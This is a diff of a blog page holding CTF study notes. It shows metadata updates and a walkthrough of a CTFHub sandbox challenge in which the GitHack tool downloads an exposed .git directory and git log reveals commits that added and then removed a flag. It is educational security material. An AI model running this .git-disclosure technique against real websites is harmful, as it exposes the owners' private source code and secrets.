@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://xenonwzh.github.io/ctf-info-notes/phpinfo.png">
 <meta property="og:image" content="https://xenonwzh.github.io/ctf-info-notes/svn.png">
 <meta property="article:published_time" content="2023-02-09T11:35:05.000Z">
-<meta property="article:modified_time" content="2023-02-09T14:22:04.916Z">
+<meta property="article:modified_time" content="2023-02-10T00:57:56.109Z">
 <meta property="article:author" content="XenonWZH">
 <meta property="article:tag" content="学习笔记">
 <meta property="article:tag" content="CTF">
@@ -165,7 +165,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">103</span>
+          <span class="site-state-item-count">104</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,7 +176,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">120</span>
+        <span class="site-state-item-count">121</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -276,9 +276,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-02-09 19:35:05 / 修改时间：22:22:04" itemprop="dateCreated datePublished" datetime="2023-02-09T19:35:05+08:00">2023-02-09</time>
+      <time title="创建时间：2023-02-09 19:35:05" itemprop="dateCreated datePublished" datetime="2023-02-09T19:35:05+08:00">2023-02-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-02-10 08:57:56" itemprop="dateModified" datetime="2023-02-10T08:57:56+08:00">2023-02-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -408,7 +414,7 @@ target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">Git
 <h2 id="log">Log</h2>
 <p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 信息泄露 -&gt; Git 泄露
 -&gt; Log</p>
-<p>我们可以使用 GitHack 下载 .git 目录：</p>
+<p>我们可以使用 GitHack 下载 .git 目录（部分信息已用省略号代替）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack]</span><br><span class="line">└─$ python2 GitHack.py http://challenge-XXX.sandbox.ctfhub.com:XXXXX/.git</span><br><span class="line"></span><br><span class="line">  ____ _ _   _   _            _</span><br><span class="line"> / ___(_) |_| | | | __ _  ___| | __</span><br><span class="line">| |  _| | __| |_| |/ _` |/ __| |/ /</span><br><span class="line">| |_| | | |_|  _  | (_| | (__|   &lt;</span><br><span class="line"> \____|_|\__|_| |_|\__,_|\___|_|\_\&#123;0.0.5&#125;</span><br><span class="line"> A &#x27;.git&#x27; folder disclosure exploit.</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[+] Clone Success. Dist File : /home/xenonwzh/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX</span><br></pre></td></tr></table></figure>
 <p>进入目录，使用 <code>git log</code> 查看历史记录：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(xenonwzh㉿XenonWZH-Surface)-[~/tools/GitHack/dist/challenge-XXX.sandbox.ctfhub.com_XXXXX]</span><br><span class="line">└─$ git log</span><br><span class="line">commit 6a33734b8bd143ae206f09038228b5710eb977ff (HEAD -&gt; master)</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    remove flag</span><br><span class="line"></span><br><span class="line">commit 456770445cf233de909d4c743c7cf91920a10dcd</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    add flag</span><br><span class="line"></span><br><span class="line">commit b3b431f8245eb637be4efe11a8f507802b55f76e</span><br><span class="line">Author: CTFHub &lt;sandbox@ctfhub.com&gt;</span><br><span class="line">Date:   Thu Feb 9 12:50:02 2023 +0000</span><br><span class="line"></span><br><span class="line">    init</span><br></pre></td></tr></table></figure>
